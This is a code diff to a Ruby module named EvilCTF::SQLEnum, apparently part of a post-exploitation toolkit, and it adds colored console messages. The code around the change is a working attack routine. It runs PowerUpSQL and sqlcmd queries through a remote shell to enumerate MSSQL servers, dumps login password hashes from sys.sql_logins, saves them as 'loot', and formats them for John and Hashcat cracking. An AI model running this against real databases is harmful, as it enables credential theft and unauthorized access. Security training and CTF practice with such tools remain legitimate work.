@@ -6,8 +6,9 @@ require 'json'
 require 'time'
 
 module EvilCTF::SQLEnum
+  require 'colorize'
   def self.run_sql_enum(shell)
-    puts "\n[*] Starting SQL Enumeration..."
+    puts "\n[*] Starting SQL Enumeration...".colorize(:cyan)
 
     loot_dir = 'loot/sql'
     FileUtils.mkdir_p(loot_dir) unless Dir.exist?(loot_dir)
@@ -19,12 +20,12 @@ module EvilCTF::SQLEnum
     using_powerup = false
 
     if shell.run("Test-Path '#{powerup_path}'").output.strip == "True"
-      puts "[+] PowerUpSQL found. Importing..."
+      puts "[+] PowerUpSQL found. Importing...".colorize(:green)
       shell.run("Import-Module '#{powerup_path}' -Force")
       using_powerup = true
     else
-      puts "[!] PowerUpSQL not found at #{powerup_path}"
-      puts "[*] To enable advanced enumeration, run: tool powerupsql"
+      puts "[!] PowerUpSQL not found at #{powerup_path}".colorize(:yellow)
+      puts "[*] To enable advanced enumeration, run: tool powerupsql".colorize(:light_black)
     end
 
     # PowerUpSQL queries
@@ -57,7 +58,7 @@ module EvilCTF::SQLEnum
       }
 
       queries.each do |label, cmd|
-        puts "\n=== #{label} ==="
+        puts "\n=== #{label} ===".colorize(:light_black)
         begin
           result = shell.run(cmd)
           output = result.output.strip
@@ -65,17 +66,17 @@ module EvilCTF::SQLEnum
           puts results[label]
           File.write(File.join(loot_dir, "#{label.downcase.gsub(/\s+/, '_')}.txt"), output)
         rescue => e
-          puts "[!] Failed #{label}: #{e.message}"
+          puts "[!] Failed #{label}: #{e.message}".colorize(:red)
         end
       end
     end
 
     # sqlcmd fallback
-    puts "\n[*] Checking for sqlcmd.exe..."
+    puts "\n[*] Checking for sqlcmd.exe...".colorize(:cyan)
     sqlcmd_present = !shell.run("Get-Command sqlcmd -ErrorAction SilentlyContinue").output.strip.empty?
 
     if sqlcmd_present
-      puts "[+] sqlcmd found. Executing fallback checks..."
+      puts "[+] sqlcmd found. Executing fallback checks...".colorize(:green)
       fallback = {
         "MSSQL Version"     => "sqlcmd -Q \"SELECT @@version\"",
         "Linked Servers"    => "sqlcmd -Q \"EXEC sp_linkedservers\"",
@@ -84,29 +85,29 @@ module EvilCTF::SQLEnum
       }
 
       fallback.each do |label, cmd|
-        puts "\n=== #{label} ==="
+        puts "\n=== #{label} ===".colorize(:light_black)
         begin
           output = shell.run(cmd).output.strip
           results[label] = output.empty? ? "[!] No output" : output
           puts results[label]
           File.write(File.join(loot_dir, "#{label.downcase.gsub(/\s+/, '_')}.txt"), output)
         rescue => e
-          puts "[!] Failed #{label}: #{e.message}"
+          puts "[!] Failed #{label}: #{e.message}".colorize(:red)
         end
       end
     else
-      puts "[!] sqlcmd.exe not available"
+      puts "[!] sqlcmd.exe not available".colorize(:yellow)
     end
 
     # SQL login hashes
-    puts "\n[*] Attempting to dump SQL login hashes..."
+    puts "\n[*] Attempting to dump SQL login hashes...".colorize(:cyan)
     begin
       hash_result = shell.run("sqlcmd -Q \"SELECT name, password_hash FROM sys.sql_logins\"")
       output = hash_result.output.strip
       if output.empty?
-        puts "[!] No hashes returned. Probably insufficient privileges."
+        puts "[!] No hashes returned. Probably insufficient privileges.".colorize(:yellow)
       else
-        puts "[+] SQL login hashes:\n#{output}"
+        puts "[+] SQL login hashes:\n#{output}".colorize(:green)
         results["SQL Login Hashes"] = output
         File.write(File.join(loot_dir, "sql_hashes.txt"), output)
 
@@ -127,27 +128,27 @@ module EvilCTF::SQLEnum
             Use with Hashcat: -m 1731
             Example: user:0100A48FAE8783F2E6AC51A...
           INFO
-          puts "[+] Hashes saved and converted to hashes_john.txt"
+          puts "[+] Hashes saved and converted to hashes_john.txt".colorize(:green)
         end
       end
     rescue => e
-      puts "[!] Failed to dump hashes: #{e.message}"
+      puts "[!] Failed to dump hashes: #{e.message}".colorize(:red)
     end
 
     # Context check
-    puts "\n[*] Checking DB User Context..."
+    puts "\n[*] Checking DB User Context...".colorize(:cyan)
     begin
       user_info = shell.run("sqlcmd -Q \"SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')\"").output.strip
-      puts "[*] User Context:\n#{user_info}"
+      puts "[*] User Context:\n#{user_info}".colorize(:cyan)
       results["Sysadmin Access"] = user_info.include?("0") ? "NO" : "YES"
     rescue
-      puts "[!] Could not determine sysadmin status"
+      puts "[!] Could not determine sysadmin status".colorize(:yellow)
     end
 
     # Save final reports
     File.write(File.join(loot_dir, "sql_enum.yaml"), results.to_yaml)
     File.write(File.join(loot_dir, "sql_enum.json"), JSON.pretty_generate(results))
-    puts "\n[+] SQL Enumeration complete. Timestamp: #{timestamp}"
-    puts "[+] Output saved in #{loot_dir}/"
+    puts "\n[+] SQL Enumeration complete. Timestamp: #{timestamp}".colorize(:green)
+    puts "[+] Output saved in #{loot_dir}/".colorize(:green)
   end
 end
